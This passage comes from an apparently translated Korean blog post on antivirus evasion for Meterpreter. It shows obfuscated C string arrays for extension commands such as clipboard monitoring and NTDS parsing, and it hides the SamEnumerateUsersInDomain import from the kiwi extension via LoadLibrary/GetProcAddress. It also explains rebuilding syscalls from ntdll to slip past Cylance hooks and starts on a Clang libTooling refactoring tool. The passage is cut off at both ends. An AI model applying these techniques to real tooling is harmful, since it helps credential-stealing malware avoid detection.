class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_vhFHmZ8u2hfz[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_pW25eeIGBeru[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span><span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_S4Ws57MYBjib[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span><span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_HJ0lD9Dl56A4[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_IiEzXils3UsR[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_czLOBo0HcqCP[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span><span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_WcWbTrsQujiT[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span><span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_rPiFTZW4ShwA[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span><span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_05fAoaZLqOoy[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span><span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_cOOyHTPTvZGK[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_smtmvW05cI9y[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_01kuYCM8z49k[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_SMK9uFj6nThk[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_PHxnGM7M0609[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_J7EGS6FRHwkV[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-number">0</span>&#125;;Command customCommands[] =&#123;    COMMAND_REQ(hid_extapi_UQOoNXigAPq4, request_window_enum),    COMMAND_REQ(hid_extapi_vhFHmZ8u2hfz, request_service_enum),    COMMAND_REQ(hid_extapi_pW25eeIGBeru, request_service_query),    COMMAND_REQ(hid_extapi_S4Ws57MYBjib, request_service_control),    COMMAND_REQ(hid_extapi_HJ0lD9Dl56A4, request_clipboard_get_data),    COMMAND_REQ(hid_extapi_IiEzXils3UsR, request_clipboard_set_data),    COMMAND_REQ(hid_extapi_czLOBo0HcqCP, request_clipboard_monitor_start),    COMMAND_REQ(hid_extapi_WcWbTrsQujiT, request_clipboard_monitor_pause),    COMMAND_REQ(hid_extapi_rPiFTZW4ShwA, request_clipboard_monitor_resume),    COMMAND_REQ(hid_extapi_05fAoaZLqOoy, request_clipboard_monitor_purge),    COMMAND_REQ(hid_extapi_cOOyHTPTvZGK, request_clipboard_monitor_stop),    COMMAND_REQ(hid_extapi_smtmvW05cI9y, request_clipboard_monitor_dump),    COMMAND_REQ(hid_extapi_01kuYCM8z49k, request_adsi_domain_query),    COMMAND_REQ(hid_extapi_SMK9uFj6nThk, ntds_parse),    COMMAND_REQ(hid_extapi_PHxnGM7M0609, request_wmi_query),    COMMAND_REQ(hid_extapi_J7EGS6FRHwkV, request_pageant_send_query),    COMMAND_TERMINATOR&#125;;</code></pre><h2 id="API-Import-숨기기"><a href="#API-Import-숨기기" class="headerlink" title="API Import 숨기기"></a>API Import 숨기기</h2><p>외부 라이브러리에서 export 된 함수를 호출하면 linker가 <em>Import Address Table</em>(IAT)에 기록한다. 함수 이름은 바이너리에서 평문으로 볼 수 있고 실행하지 않고 정적으로 확인할 수 있다. 의심스러운 함수명들을 숨기고 정상적인 바이너리에 존재하는 것들은 유지하는 것이 좋다.</p><p>Meterpreter의 <em>kiwi</em> extension에서 다음과 같은 코드를 찾을 수 있다.</p><pre><code class="hljs cpp">enumStatus = SamEnumerateUsersInDomain(hDomain, &amp;EnumerationContext, <span class="hljs-number">0</span>, &amp;pEnumBuffer, <span class="hljs-number">100</span>, &amp;CountRetourne</code></pre><p>이 함수는 <code>samlib.dll</code>에서 export 되므로 컴파일된 바이너리에는 <code>samlib.dll</code>과 <code>SamEnumberateUsersInDomain</code> 문자열이 표시된다.</p><p>이를 해결하기 위해 실행 중에 <code>LoadLibrary/GetProcAddress</code>를 사용하여 API를 가져올 수 있다. 이 함수들은 문자열을 인자로 사용하므로 난독화를 잘해야 한다. 따라서 위의 코드를 다음과 같이 재작성해야 한다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(__stdcall* _SamEnumerateUsersInDomain)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    SAMPR_HANDLE DomainHandle,</span></span><span class="hljs-function"><span class="hljs-params">    PDWORD EnumerationContext,</span></span><span class="hljs-function"><span class="hljs-params">    DWORD UserAccountControl,</span></span><span class="hljs-function"><span class="hljs-params">    PSAMPR_RID_ENUMERATION* Buffer,</span></span><span class="hljs-function"><span class="hljs-params">    DWORD PreferedMaximumLength,</span></span><span class="hljs-function"><span class="hljs-params">    PDWORD CountReturned</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-keyword">char</span> hid_SAMLIB_01zmejmkLCHt[] = &#123;<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_SamEnu_BZxlW5ZBUAAe[] = &#123;<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-number">0</span>&#125;;HANDLE hhid_SAMLIB_BZUriyLrlgrJ = LoadLibrary(hid_SAMLIB_01zmejmkLCHt);_SamEnumerateUsersInDomain ffSamEnumerateUsersInDoma =(_SamEnumerateUsersInDomain)GetProcAddress(hhid_SAMLIB_BZUriyLrlgrJ, hid_SamEnu_BZxlW5ZBUAAe);enumStatus = ffSamEnumerateUsersInDoma(hDomain, &amp;EnumerationContext, <span class="hljs-number">0</span>, &amp;pEnumBuffer, <span class="hljs-number">100</span>, &amp;CountRetourned);</code></pre><h2 id="syscall-재작성"><a href="#syscall-재작성" class="headerlink" title="syscall 재작성"></a>syscall 재작성</h2><p>Cylance가 실행 중인 컴퓨터에서 Meterpreter의 <em>migrate</em>를 사용하면 안티바이러스 탐지가 실행된다. Cylance는 userland hook으로 프로세스 인젝션을 탐지한다. 탐지를 우회하려면 hook을 제거하는 것으로 간단히 우회할 수 있다. ntdll을 읽은 후 syscall 번호를 복구하고 ready-to-call shellcode에 삽입하는 것은 간단하고 userland hook을 효과적으로 우회한다. 필자는 지금까지 NTDLL.DLL을 악성 파일로 판단하는 것을 보지 못했다.</p><h1 id="구현"><a href="#구현" class="headerlink" title="구현"></a>구현</h1><p>앞서 말한 모든 아이디어들은 <em>libTooling</em>을 기반으로 한 source code refactoring tool에서 구현할 수 있다. 이 부분은 <em>libTooling</em> 문서가 부족해서 필자의 팀에서 가능한 시간 동안 한 것을 문서화했다. 따라서 개선의 여지가 있으며 무언가 눈에 띄는 경우 필자는 그것에 대해 듣고 싶다.</p><h2 id="추상-구문-트리-101"><a href="#추상-구문-트리-101" class="headerlink" title="추상 구문 트리 101"></a>추상 구문 트리 101</h2><p>컴파일러는 보통 여러 구성 요소로 구성되는데 일반적으로 <em>Parser</em>와 <em>Lexer</em>로 구성된다. 소스 코드가 컴파일러에 들어가면 먼저 프로그래머가 작성한 원본 소스 코드에서 Parse Tree를 생성하고 컴파일러가 필요로 하는 노드에 semantic information을 추가한다. 이 결과를 <em>Abstract Syntax Tree</em>(추상 구문 트리)라고 부른다. 다음은 위키피디아의 예시이다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">while</span> b ≠ <span class="hljs-number">0</span>  <span class="hljs-keyword">if</span> a &gt; b    a := a − b  <span class="hljs-keyword">else</span>    b := b − a<span class="hljs-keyword">return</span> a</code></pre><p>간단한 프로그램의 일반적인 AST는 다음과 같다.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/2.png"></p><p><a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">추상 구문 트리 예시</a></p><p>이 데이터 구조는 다른 프로그램의 property를 이해하는 프로그램을 작성할 때 정밀한 알고리즘을 제공하므로 대규모 코드 refactoring에 적합하다.</p><h3 id="Clang’s-Abstract-Syntax-Tree"><a href="#Clang’s-Abstract-Syntax-Tree" class="headerlink" title="Clang’s Abstract Syntax Tree"></a>Clang’s Abstract Syntax Tree</h3><p>The Right Way의 소스 코드를 변경해야 하므로 Clang의 AST에 대해 알아야 한다. Clagn은 AST 덤프를 command-line switch에 예쁘게 표시하지만 컴파일러 플래그 설정이 까다롭다.</p><p>간단한 테스트 translation unit을 만들어보자.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span> <span class="hljs-params">(NTAPI *f_NtMapViewOfSection)</span><span class="hljs-params">(HANDLE, HANDLE, PVOID *, ULONG, ULONG,</span></span><span class="hljs-function"><span class="hljs-params">PLARGE_INTEGER, PULONG, ULONG, ULONG, ULONG)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;    f_NtMapViewOfSection lNtMapViewOfSection;    HMODULE ntdll;    <span class="hljs-keyword">if</span> 